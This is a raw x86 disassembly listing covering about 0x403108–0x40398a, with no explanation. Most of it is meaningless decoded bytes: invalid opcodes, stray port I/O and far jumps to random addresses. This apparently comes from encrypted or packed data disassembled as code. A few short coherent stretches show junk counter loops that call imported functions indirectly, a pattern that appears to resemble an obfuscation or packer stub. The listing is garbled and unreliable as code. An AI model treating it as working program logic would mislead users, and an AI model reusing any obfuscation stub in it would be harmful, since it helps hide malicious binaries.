  403108:	(bad)  
  40310a:	loopne 0x403159
  40310c:	(bad)  
  40310e:	out    dx,eax
  40310f:	push   cs
  403110:	fstp   DWORD PTR [esi-0x57]
  403113:	push   ebx
  403114:	add    esi,DWORD PTR [esp+ebx*4-0x64f967dd]
  40311b:	sti    
  40311c:	fmul   DWORD PTR [esi+0x79be2d92]
  403122:	lock xor al,bl
  403125:	mov    ah,0x4a
  403127:	aam    0xb5
  403129:	dec    eax
  40312a:	in     al,0x35
  40312c:	aaa    
  40312d:	mov    esi,0xf34a710d
  403132:	scas   eax,DWORD PTR es:[edi]
  403133:	inc    ebx
  403134:	xlat   BYTE PTR ds:[ebx]
  403135:	out    0x97,eax
  403137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403138:	mov    bh,0x1e
  40313a:	int3   
  40313b:	or     al,dh
  40313d:	sub    al,BYTE PTR [esi]
  40313f:	retf   0xcbdb
  403142:	mov    edx,0x2079e2a5
  403147:	pushf  
  403148:	dec    ecx
  403149:	cld    
  40314a:	inc    ebx
  40314b:	fst    DWORD PTR gs:[esi-0x38]
  40314f:	call   0xc9a6ea08
  403154:	adc    al,0xa8
  403156:	repz push ebx
  403158:	loopne 0x40315c
  40315a:	shr    DWORD PTR [ebp-0x70],0xab
  40315e:	xchg   edi,eax
  40315f:	out    dx,eax
  403160:	jns    0x4031e0
  403162:	bound  edx,QWORD PTR [ebp-0x14]
  403165:	ja     0x40317e
  403167:	out    0xca,al
  403169:	mov    cl,0xb2
  40316b:	inc    eax
  40316c:	xchg   edx,eax
  40316d:	test   DWORD PTR [edi-0x7],esi
  403170:	inc    esp
  403171:	mov    cl,0x57
  403173:	and    eax,DWORD PTR [eax+0x74]
  403176:	fcomip st,st(7)
  403178:	sub    cl,BYTE PTR [ecx+0x47d0c420]
  40317e:	or     BYTE PTR [edi+0xb],ch
  403181:	loop   0x403114
  403183:	int3   
  403184:	enter  0xac2e,0x2d
  403188:	ret    
  403189:	out    0xa,al
  40318b:	adc    BYTE PTR [eax+0x347354b2],bh
  403191:	in     eax,0x3e
  403193:	stos   DWORD PTR es:[edi],eax
  403194:	xchg   esp,eax
  403195:	in     eax,dx
  403196:	repz aad 0xce
  403199:	jecxz  0x403136
  40319b:	push   ecx
  40319c:	dec    ebx
  40319d:	cmp    al,0x58
  40319f:	inc    edx
  4031a0:	stos   BYTE PTR es:[edi],al
  4031a1:	stos   DWORD PTR es:[edi],eax
  4031a2:	mov    dl,0x72
  4031a4:	stos   BYTE PTR es:[edi],al
  4031a5:	ror    DWORD PTR [ebx+0x7a227c72],cl
  4031ab:	mov    WORD PTR ds:0x746f0640,fs
  4031b1:	xchg   DWORD PTR [edi+0xa671958],ebp
  4031b7:	aam    0x7a
  4031b9:	(bad)  
  4031bb:	bound  edi,QWORD PTR [ecx-0x1f6b1d24]
  4031c1:	jb     0x403144
  4031c3:	(bad)  
  4031c4:	push   esp
  4031c5:	mov    ebp,0xbf245f92
  4031ca:	jb     0x4031ca
  4031cc:	xchg   ebp,eax
  4031cd:	call   0x85c1:0x902c2e8e
  4031d4:	push   ecx
  4031d5:	add    ah,BYTE PTR [ebx+0x4239062b]
  4031db:	adc    cl,dl
  4031dd:	les    eax,FWORD PTR [eax+0x24e43ade]
  4031e3:	jmp    0x9b5d5045
  4031e8:	jmp    0xc5d50d67
  4031ed:	and    al,0xc1
  4031ef:	cs push esi
  4031f1:	shl    DWORD PTR [edi-0x1a6c74c8],cl
  4031f7:	jge    0x4031b8
  4031f9:	mov    esp,0xd5aacee4
  4031fe:	jl     0x40323f
  403200:	sub    dh,BYTE PTR [eax+eiz*4]
  403203:	(bad)  
  403204:	repz into 
  403206:	adc    bh,BYTE PTR [edx+0x4936ee62]
  40320c:	les    edx,FWORD PTR [esi+0x5b]
  40320f:	jge    0x40319b
  403211:	(bad)  
  403213:	(bad)
  403218:	pop    ss
  403219:	push   esi
  40321a:	and    DWORD PTR [eax],edi
  40321c:	jb     0x4031a7
  40321e:	mov    edx,0x5d40c6df
  403223:	je     0x4031b8
  403225:	add    ebx,DWORD PTR [edx+esi*4-0x30]
  403229:	std    
  40322a:	ret    
  40322b:	aam    0x85
  40322d:	retf   
  40322e:	xor    DWORD PTR [esi],ebp
  403230:	mov    BYTE PTR [edx+0x1c],ah
  403233:	cwde   
  403234:	vmwrite eax,DWORD PTR [esi]
  403237:	fstp   st(1)
  403239:	ret    0x7b53
  40323c:	pop    ebp
  40323d:	call   0xc4e5:0xd2b4f91c
  403244:	inc    ecx
  403245:	int3   
  403246:	jmp    0x403233
  403248:	fimul  WORD PTR [ecx+0x722362f3]
  40324e:	sub    BYTE PTR [esi],dh
  403250:	dec    ebx
  403251:	sar    DWORD PTR cs:[esi+0x287ee6bb],1
  403258:	xor    al,0xb
  40325a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325b:	mov    ebp,0x51754085
  403260:	xchg   edx,eax
  403261:	ja     0x403254
  403263:	cli    
  403264:	fldenv [esi+0x20]
  403267:	popa   
  403268:	mov    ebp,0x48620ad1
  40326d:	dec    ebx
  40326e:	aad    0x2e
  403270:	dec    eax
  403271:	hlt    
  403272:	fcomp  DWORD PTR [edx-0x2b5635ff]
  403278:	or     ah,BYTE PTR [eax]
  40327a:	inc    edx
  40327b:	cld    
  40327c:	in     eax,0xbb
  40327e:	dec    esi
  40327f:	mov    eax,0xc2c95bc2
  403284:	or     al,0x0
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433797,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433797
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433797,edx
  4032b3:	cmp    DWORD PTR ds:0x433797,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x43386d
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433797,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433797
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433797,edx
  4032ef:	cmp    DWORD PTR ds:0x433797,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43371b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x4337db,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x433773,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x433773
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x433773,ecx
  403332:	cmp    DWORD PTR ds:0x433773,0x1f
  403339:	jne    0x403361
  40333f:	push   0x4337d7
  403344:	push   0x4337a3
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x43394c
  403351:	push   0x43384a
  403356:	push   0x4338e7
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x433773,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x4336db,0x1f
  403378:	cmp    DWORD PTR ds:0x4336db,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x4336db,0x4
  40338c:	jne    0x40339d
  403392:	push   0x43376b
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x4336db,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x4336db
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x4336db,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x4336db
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x4336db,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x433763,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x4337ab,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x43375b,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	nop
  403412:	jecxz  0x403483
  403414:	icebp  
  403415:	push   ss
  403416:	adc    edi,DWORD PTR [esp+edi*2+0x6d]
  40341a:	jg     0x403498
  40341c:	jl     0x40346b
  40341e:	pop    ebx
  40341f:	mov    edi,DWORD PTR [ebp+0x1f]
  403422:	xchg   esp,eax
  403423:	xchg   ebp,eax
  403424:	adc    BYTE PTR [eax+0x1b],bl
  403427:	je     0x403406
  403429:	test   BYTE PTR [ebx-0x35],dl
  40342c:	sar    DWORD PTR [edx-0x59e0ea81],0xf
  403433:	jle    0x403463
  403435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403436:	mov    WORD PTR [eax+edi*8],ds
  403439:	jb     0x40341b
  40343b:	fwait
  40343c:	add    al,0x60
  40343e:	adc    eax,0x904fee94
  403443:	nop
  403444:	mov    ch,0xea
  403446:	mov    ah,0xd9
  403448:	cmp    DWORD PTR [ecx-0x6c801a6],edx
  40344e:	les    ebx,FWORD PTR [esi+0x18044658]
  403454:	rol    al,0xfe
  403457:	mov    esp,0x39510c29
  40345c:	push   es
  40345d:	or     ebp,DWORD PTR [ebx+ecx*2-0x567cfa97]
  403464:	sub    BYTE PTR [ebx+ebp*2-0x75],bh
  403468:	ins    DWORD PTR es:[edi],dx
  403469:	mov    ?,WORD PTR cs:0x2170785a
  403470:	dec    edi
  403471:	lods   eax,DWORD PTR ds:[esi]
  403472:	into   
  403473:	xchg   ebp,eax
  403474:	jae    0x40347f
  403476:	cmp    al,0xd3
  403478:	dec    ecx
  403479:	sbb    ebp,DWORD PTR [edi-0x31741797]
  40347f:	(bad)  
  403481:	push   eax
  403482:	adc    ecx,DWORD PTR [ebx-0x4a]
  403485:	mov    ah,0xb0
  403487:	mov    bl,0x1
  403489:	js     0x4034b1
  40348b:	fcmove st,st(2)
  40348d:	dec    ebx
  40348e:	(bad)  
  40348f:	jl     0x403426
  403491:	pop    edi
  403492:	lahf   
  403493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403494:	popf   
  403495:	fldl2t 
  403497:	cmp    al,0xd0
  403499:	mov    bl,0xac
  40349b:	gs push ebp
  40349d:	call   0xcdcb:0x9392599f
  4034a4:	inc    esi
  4034a5:	cmc    
  4034a6:	outs   dx,BYTE PTR ds:[esi]
  4034a7:	jp     0x40345b
  4034a9:	adc    edx,ebx
  4034ab:	mov    ch,0xe6
  4034ad:	add    cl,BYTE PTR [edi+eax*2]
  4034b0:	out    0xaf,eax
  4034b2:	push   ebp
  4034b3:	fidivr WORD PTR [ebp-0x65]
  4034b6:	jae    0x4034b1
  4034b8:	mov    gs,ebp
  4034ba:	push   ecx
  4034bb:	scas   al,BYTE PTR es:[edi]
  4034bc:	test   eax,0xe9e52759
  4034c1:	sbb    dl,bl
  4034c3:	aas    
  4034c4:	shl    BYTE PTR [ebp+0x4e],1
  4034c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c8:	(bad)  
  4034c9:	repnz pop ebx
  4034cb:	lods   al,BYTE PTR ds:[esi]
  4034cc:	mov    eax,ds:0xc67828f7
  4034d1:	jmp    0x6d9401e
  4034d6:	or     edi,ebx
  4034d8:	mov    ch,dh
  4034da:	cmp    DWORD PTR [esi-0x58dd110d],0x6e
  4034e1:	(bad)  
  4034e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034e3:	test   al,0x9e
  4034e5:	lock jbe 0x40355b
  4034e8:	xchg   edx,eax
  4034e9:	out    0x82,al
  4034eb:	repz cmp edx,DWORD PTR [edx]
  4034ee:	pop    eax
  4034ef:	ins    BYTE PTR es:[edi],dx
  4034f0:	mov    ch,BYTE PTR [edi+esi*2]
  4034f3:	and    al,0xf4
  4034f5:	add    al,0x8a
  4034f7:	mov    ecx,0x17b101d1
  4034fc:	jno    0x40348e
  4034fe:	mov    al,0x80
  403500:	mov    gs,esp
  403502:	add    edx,DWORD PTR [esi-0x49]
  403505:	nop
  403506:	adc    DWORD PTR [edi+0x2d914d2f],edx
  40350c:	push   ecx
  40350d:	sbb    ecx,ebx
  40350f:	and    DWORD PTR [edi],eax
  403511:	sbb    dh,cl
  403513:	add    edx,DWORD PTR [esi+ebp*2]
  403516:	popf   
  403517:	pop    esi
  403518:	dec    eax
  403519:	jo     0x40352e
  40351b:	outs   dx,DWORD PTR ds:[esi]
  40351c:	mov    al,0x45
  40351e:	and    al,bl
  403520:	fptan  
  403522:	and    al,bh
  403524:	inc    ebx
  403525:	les    esi,FWORD PTR [edi+0x6d]
  403528:	xor    BYTE PTR [edi],dl
  40352a:	lahf   
  40352b:	add    eax,DWORD PTR [edi-0x6]
  40352e:	lods   eax,DWORD PTR ds:[esi]
  40352f:	cmp    DWORD PTR [eax-0x6f],edi
  403532:	mov    edi,0xb0b58bf3
  403537:	and    edi,DWORD PTR [esi]
  403539:	(bad)  
  40353b:	and    BYTE PTR [edx],0x4d
  40353e:	in     al,dx
  40353f:	mov    bh,0xbf
  403541:	out    0xed,eax
  403543:	mov    bl,0x96
  403545:	jnp    0x403584
  403547:	call   0xb005:0x88055dc3
  40354e:	fisub  WORD PTR [ebx]
  403550:	inc    ebx
  403551:	(bad)
  403555:	mov    al,0x82
  403557:	push   ebx
  403558:	xor    bh,ch
  40355a:	nop
  40355b:	add    al,0xb0
  40355d:	xchg   ecx,eax
  40355e:	bound  edx,QWORD PTR [esp+ecx*4+0x2c]
  403562:	push   0xffffffd8
  403564:	and    DWORD PTR [edx+edi*2],esi
  403567:	and    al,0x5e
  403569:	sub    DWORD PTR [edx-0x486caf7b],ebx
  40356f:	push   ds
  403570:	lods   al,BYTE PTR ds:[esi]
  403571:	xchg   esp,eax
  403572:	and    eax,0xca3295af
  403577:	aaa    
  403578:	push   es
  403579:	add    BYTE PTR [ecx-0x7523f927],al
  40357f:	test   eax,0xab15f570
  403584:	and    al,0x4a
  403586:	stc    
  403587:	or     al,0x20
  403589:	rol    BYTE PTR [edx-0x17],0x7a
  40358d:	dec    eax
  40358e:	inc    edi
  40358f:	addr16 leave 
  403591:	pop    ebp
  403592:	and    DWORD PTR [esi],eax
  403594:	push   esi
  403595:	dec    esi
  403596:	adc    cl,BYTE PTR [edx]
  403598:	mov    al,0xbc
  40359a:	popa   
  40359b:	test   al,0x75
  40359d:	loop   0x4035f4
  40359f:	fidiv  DWORD PTR [edi+0x527cf9a5]
  4035a5:	or     BYTE PTR [ecx+0x2ed234b4],0xbc
  4035ac:	dec    esi
  4035ad:	ret    0x260c
  4035b0:	popa   
  4035b1:	xor    ebp,DWORD PTR [edx+0x41]
  4035b4:	sbb    eax,0x58547ed6
  4035b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ba:	push   esi
  4035bb:	fs call 0x7cd529f6
  4035c1:	sub    al,0xd4
  4035c3:	cmp    ecx,DWORD PTR [bp+si-0x1e]
  4035c7:	jg     0x403601
  4035c9:	ja     0x4035f8
  4035cb:	out    0x9e,eax
  4035cd:	push   edi
  4035ce:	mov    dh,0xbe
  4035d0:	xchg   ebx,eax
  4035d1:	(bad)  
  4035d2:	in     eax,dx
  4035d3:	cli    
  4035d4:	imul   ebp,DWORD PTR [ebx],0xffffffd5
  4035d7:	pop    ecx
  4035d8:	fucom  st(1)
  4035da:	fstp   QWORD PTR [ebx]
  4035dc:	xchg   ebp,eax
  4035dd:	sbb    eax,0xbef6c3cc
  4035e2:	ds inc esi
  4035e4:	jbe    0x403605
  4035e6:	xor    DWORD PTR [ebx-0x5c],eax
  4035e9:	ror    BYTE PTR [esi+ebp*4],cl
  4035ec:	inc    esi
  4035ed:	jmp    0x4035de
  4035ef:	mov    eax,0x7d78d16b
  4035f4:	cmp    eax,0xe20700ad
  4035f9:	(bad)  
  4035fa:	addr16 leave 
  4035fc:	pop    ss
  4035fd:	jnp    0x4035e4
  4035ff:	test   eax,0x47aa1acf
  403604:	into   
  403605:	stos   DWORD PTR es:[edi],eax
  403606:	(bad)  [eax]
  403608:	push   ebp
  403609:	pop    ebx
  40360a:	sti    
  40360b:	or     DWORD PTR [ebx+0x458bf855],ecx
  403611:	cld    
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x4e5cb676
  403649:	adc    eax,DWORD PTR [edi]
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	daa    
  403653:	fcmovb st,st(7)
  403655:	xor    BYTE PTR [edi],dh
  403657:	xchg   esp,eax
  403658:	cmp    DWORD PTR [edx+ebx*1-0x7ac5572a],0xaa230f0d
  403663:	add    al,0xd5
  403665:	inc    esp
  403666:	sub    cl,BYTE PTR [ebp+esi*1+0x14]
  40366a:	pushf  
  40366b:	push   esi
  40366c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40366d:	adc    DWORD PTR [ebp+0xa],0xfffffff5
  403671:	outs   dx,BYTE PTR ds:[esi]
  403672:	cmp    BYTE PTR [edi+edx*2+0x28],bh
  403676:	lock jmp 0xafa9:0xb6e1c743
  40367e:	leave  
  40367f:	lds    esp,FWORD PTR [ecx+esi*4]
  403682:	ins    BYTE PTR es:[edi],dx
  403683:	test   BYTE PTR [edi+eax*4],dh
  403686:	push   esp
  403687:	jo     0x4036a0
  403689:	test   BYTE PTR [ebp+ecx*8+0x25],bh
  40368d:	je     0x40364b
  40368f:	sub    DWORD PTR [edx+0x8c560f3],ebp
  403695:	fs mov ah,0x6d
  403698:	in     al,dx
  403699:	(bad)  
  40369a:	dec    esp
  40369b:	inc    ebx
  40369c:	xchg   edx,eax
  40369d:	push   0x3a19c7d2
  4036a2:	out    dx,al
  4036a3:	adc    eax,0x47c417a5
  4036a8:	in     eax,0xa1
  4036aa:	daa    
  4036ab:	xchg   ecx,eax
  4036ac:	cmp    BYTE PTR [eax-0x5440d9f1],0x6d
  4036b3:	jns    0x40372b
  4036b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b6:	cmp    al,0x45
  4036b8:	xchg   BYTE PTR [ebp+eax*2+0x44],al
  4036bc:	dec    edi
  4036bd:	aad    0xb9
  4036bf:	std    
  4036c0:	or     al,0xd2
  4036c2:	ins    DWORD PTR es:[edi],dx
  4036c3:	sub    DWORD PTR [edi+0x17],ebx
  4036c6:	stc    
  4036c7:	pusha  
  4036c8:	push   0x7dbd0457
  4036cd:	cs stos DWORD PTR es:[edi],eax
  4036cf:	push   es
  4036d0:	sbb    BYTE PTR [edi+0x36cbf242],0xbf
  4036d7:	mov    ebp,0x35808278
  4036dc:	fwait
  4036dd:	mov    ds:0xee4e32f8,eax
  4036e2:	mov    al,ds:0xd2e0e3d3
  4036e7:	mov    dh,0x3c
  4036e9:	push   esp
  4036ea:	or     DWORD PTR [ecx],edi
  4036ec:	in     eax,dx
  4036ed:	data16 int3 
  4036ef:	adc    BYTE PTR [edx+0x52791b4],dh
  4036f5:	out    0x4f,eax
  4036f7:	sub    BYTE PTR [eax],bh
  4036f9:	xchg   BYTE PTR [ecx-0x61],dl
  4036fc:	(bad)  
  4036fe:	enter  0xa115,0xf1
  403702:	(bad)  
  403703:	adc    eax,0x326f4517
  403708:	aad    0x19
  40370a:	in     al,0x6f
  40370c:	inc    esi
  40370d:	dec    ebp
  40370e:	pushf  
  40370f:	aaa    
  403710:	xor    BYTE PTR [ecx+0x67],al
  403713:	cmp    esp,DWORD PTR [edi-0x297d64ef]
  403719:	cld    
  40371a:	jle    0x40369d
  40371c:	lds    esp,FWORD PTR [edx]
  40371e:	ds enter 0x99bd,0x3a
  403723:	jg     0x403718
  403725:	pop    esp
  403726:	mov    bh,0x6
  403728:	cli    
  403729:	and    al,0x1a
  40372b:	mov    edx,0xa1632a53
  403730:	iret   
  403731:	cmp    ecx,edi
  403733:	shl    DWORD PTR [ecx+ebx*2+0x74],1
  403737:	jnp    0x4036c2
  403739:	stos   DWORD PTR es:[edi],eax
  40373a:	fs aam 0xc1
  40373d:	pop    eax
  40373e:	mov    ds:0xef3e283,eax
  403743:	arpl   WORD PTR [ecx+ecx*1+0x79],ax
  403747:	mov    dh,0xc4
  403749:	mov    al,0x21
  40374b:	mov    cl,0xfb
  40374d:	lea    edi,[ebp-0x7f]
  403750:	push   edx
  403751:	pop    edi
  403752:	dec    esp
  403753:	inc    esp
  403754:	pop    edi
  403755:	cdq    
  403756:	pop    esi
  403757:	pushf  
  403758:	in     eax,0xef
  40375a:	in     al,0x95
  40375c:	lahf   
  40375d:	scas   eax,DWORD PTR es:[edi]
  40375e:	sbb    ah,BYTE PTR [eax+0x5b5c6a03]
  403764:	cmp    ecx,ecx
  403766:	jnp    0x4037a9
  403768:	outs   dx,DWORD PTR ds:[esi]
  403769:	mov    edx,cs
  40376b:	sbb    eax,0x764592ec
  403770:	adc    ah,BYTE PTR [ebp+0x28]
  403773:	outs   dx,DWORD PTR ds:[esi]
  403774:	jmp    0x7bcc:0x9bf5204a
  40377b:	out    0xe9,al
  40377d:	jl     0x40370e
  40377f:	cdq    
  403780:	xchg   esi,eax
  403781:	aam    0xdd
  403783:	pop    ds
  403784:	inc    eax
  403785:	inc    edx
  403786:	xchg   si,ax
  403788:	xchg   ebx,edi
  40378a:	push   eax
  40378b:	pop    ds
  40378c:	xlat   BYTE PTR ds:[ebx]
  40378d:	push   ebx
  40378e:	inc    ecx
  40378f:	sub    DWORD PTR [esi],edi
  403791:	mov    edx,0x2b3de8ee
  403796:	lahf   
  403797:	ja     0x40373e
  403799:	xor    esp,DWORD PTR [eax+0x38]
  40379c:	dec    ebx
  40379d:	or     esp,DWORD PTR [esi-0x2a74c01b]
  4037a3:	inc    edx
  4037a4:	data16 jns 0x403825
  4037a7:	jae    0x4037ed
  4037a9:	fist   WORD PTR [esi-0x23]
  4037ac:	lock daa 
  4037ae:	dec    edi
  4037af:	and    dl,dh
  4037b1:	dec    esp
  4037b2:	xlat   BYTE PTR ds:[ebx]
  4037b3:	sbb    DWORD PTR [ebp+0x66a2c56a],0xdf99f593
  4037bd:	jle    0x40378c
  4037bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037c0:	or     ebp,DWORD PTR [edi]
  4037c2:	in     eax,0xe8
  4037c4:	jns    0x40381a
  4037c6:	push   0x57363758
  4037cb:	sbb    al,0x90
  4037cd:	rcr    DWORD PTR [ebx+0x71],cl
  4037d0:	jmp    0x582f:0x4dd391ee
  4037d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037d8:	pushf  
  4037d9:	sub    eax,0x6426d33e
  4037de:	out    0x78,eax
  4037e0:	mov    edx,0x2fe622f6
  4037e5:	mov    eax,0xa75d48a8
  4037ea:	mov    dl,0x12
  4037ec:	les    ebx,FWORD PTR [edi-0x7f]
  4037ef:	pusha  
  4037f0:	cmp    eax,0x914cb2be
  4037f5:	xor    eax,0xebe47d6
  4037fa:	scas   al,BYTE PTR es:[edi]
  4037fb:	mov    es,WORD PTR ds:0xe5951223
  403801:	loop   0x403851
  403803:	(bad)  
  403804:	scas   eax,DWORD PTR es:[edi]
  403805:	mov    ecx,0x9b44fea0
  40380a:	(bad)  
  40380b:	add    eax,0x7f4fa0c3
  403810:	ret    
  403811:	push   ebp
  403812:	push   0xfffffffb
  403814:	mov    al,ds:0xce068bf4
  403819:	inc    ecx
  40381a:	and    eax,0x88ed2b04
  40381f:	scas   al,BYTE PTR es:[edi]
  403820:	sbb    ecx,edx
  403822:	mov    gs,WORD PTR [ebp+0x1895b8d]
  403828:	lods   eax,DWORD PTR ds:[esi]
  403829:	jg     0x403817
  40382b:	repnz call 0xe48a:0x441429a6
  403833:	jno    0x403854
  403835:	pmulhw mm3,QWORD PTR [ebx-0x72f0ffb0]
  40383c:	icebp  
  40383d:	ins    DWORD PTR es:[edi],dx
  40383e:	(bad)  
  40383f:	pop    esp
  403840:	push   ss
  403841:	mov    eax,DWORD PTR [ebp-0x8]
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	mov    eax,ds:0x742506a9
  40385a:	sbb    al,0x7c
  40385c:	jl     0x4038cb
  40385e:	jg     0x4038dc
  403860:	jl     0x403871
  403862:	mov    edi,0xe0330e0d
  403867:	scas   al,BYTE PTR es:[edi]
  403868:	repnz inc esp
  40386a:	add    esp,eax
  40386c:	ror    DWORD PTR [eax+ecx*1],0x45
  403870:	aam    0xcf
  403872:	push   es
  403873:	mov    dh,0xa0
  403875:	jmp    DWORD PTR [ebx]
  403877:	cwde   
  403878:	jbe    0x40382b
  40387a:	fwait
  40387b:	dec    esi
  40387c:	mov    al,0x67
  40387e:	mov    bh,0xff
  403880:	mov    BYTE PTR [edx+0x58],al
  403883:	adc    al,0x5f
  403885:	cmp    DWORD PTR [ecx+eiz*1+0x642c8c67],eax
  40388c:	adc    ecx,esi
  40388e:	xlat   BYTE PTR ds:[ebx]
  40388f:	loope  0x403832
  403891:	inc    edi
  403892:	int3   
  403893:	pop    edi
  403894:	jmp    0xa3b2:0x4b14ce2f
  40389b:	inc    ecx
  40389c:	ins    BYTE PTR es:[edi],dx
  40389d:	dec    ecx
  40389e:	sub    al,0x99
  4038a0:	gs (bad) 
  4038a2:	sub    BYTE PTR [esi-0x1b],dl
  4038a5:	fmul   QWORD PTR [esi+0x104d89d2]
  4038ab:	loopne 0x40383e
  4038ad:	and    DWORD PTR [ecx],0x33f726e6
  4038b3:	xchg   DWORD PTR [edx-0x30],esp
  4038b6:	add    eax,0x6b26166d
  4038bb:	mov    ds:0x7ad1fe57,eax
  4038c0:	jb     0xaa6895a6
  4038c6:	es mov cl,0x4a
  4038c9:	out    dx,eax
  4038ca:	ss stos DWORD PTR es:[edi],eax
  4038cc:	sub    bh,BYTE PTR [eax-0x3e]
  4038cf:	imul   edx,DWORD PTR [esi],0x33
  4038d2:	mov    edi,0xb0833ef0
  4038d7:	retf   
  4038d8:	adc    eax,0x332034e2
  4038dd:	bound  ebp,QWORD PTR [ebp-0x3a]
  4038e0:	cmc    
  4038e1:	pusha  
  4038e2:	(bad)  
  4038e3:	jg     0x4038d4
  4038e5:	push   cs
  4038e6:	shl    BYTE PTR [edi+0x165628e9],1
  4038ec:	(bad)  
  4038ed:	(bad)  
  4038ef:	push   0xffffffaf
  4038f1:	jp     0x40393c
  4038f3:	gs pusha 
  4038f5:	xchg   ebp,eax
  4038f6:	mov    ebp,0xc73ac0e2
  4038fb:	pop    ds
  4038fc:	jmp    0x4038e2
  4038fe:	xchg   DWORD PTR [eax+0x42993a1c],esi
  403904:	mov    edx,0x788f00ef
  403909:	jmp    0x4038ca
  40390b:	mov    ds:0x738a230,eax
  403910:	adc    DWORD PTR [ebx],edi
  403912:	mov    ebp,cs
  403914:	ss (bad) 
  403917:	xchg   esp,eax
  403918:	js     0x403949
  40391a:	mov    ebx,0xde830a9c
  40391f:	inc    ebx
  403920:	out    dx,eax
  403921:	and    dh,dl
  403923:	adc    eax,edx
  403925:	and    DWORD PTR [ebp-0x5a9e8612],ebx
  40392b:	shl    bl,0xff
  40392e:	and    BYTE PTR [eax],dl
  403930:	loopne 0x403959
  403932:	add    BYTE PTR [ecx-0x46],dh
  403935:	das    
  403936:	mov    ebx,0xee27b4fb
  40393b:	fs sahf 
  40393d:	ja     0x4038d0
  40393f:	mov    ah,0x5
  403941:	xor    bh,BYTE PTR [edx+edx*8+0x71]
  403945:	or     BYTE PTR [eax+edi*4-0x62b99057],dh
  40394c:	int3   
  40394d:	push   edi
  40394e:	ret    0x2a67
  403951:	jmp    0x4038fd
  403953:	jmp    0x70e2d32c
  403958:	or     DWORD PTR [esi-0xcfe2c65],eax
  40395e:	neg    BYTE PTR [edi+0x2903f203]
  403964:	mov    dl,bh
  403966:	loope  0x403973
  403968:	mov    esi,0xa017c11e
  40396d:	stc    
  40396e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40396f:	jns    0x4039b7
  403971:	push   eax
  403972:	pushf  
  403973:	xlat   BYTE PTR ds:[ebx]
  403974:	xchg   ebp,eax
  403975:	sar    DWORD PTR [edx-0x24],0x8d
  403979:	(bad)  
  40397b:	push   ds
  40397c:	enter  0xb3d9,0xed
  403980:	out    0xef,eax
  403982:	dec    ebx
  403983:	das    
  403984:	lods   al,BYTE PTR ds:[esi]
  403985:	push   esi
  403986:	mov    WORD PTR [esi+0x4a],es
  403989:	pop    esp
  40398a:	inc    ebx
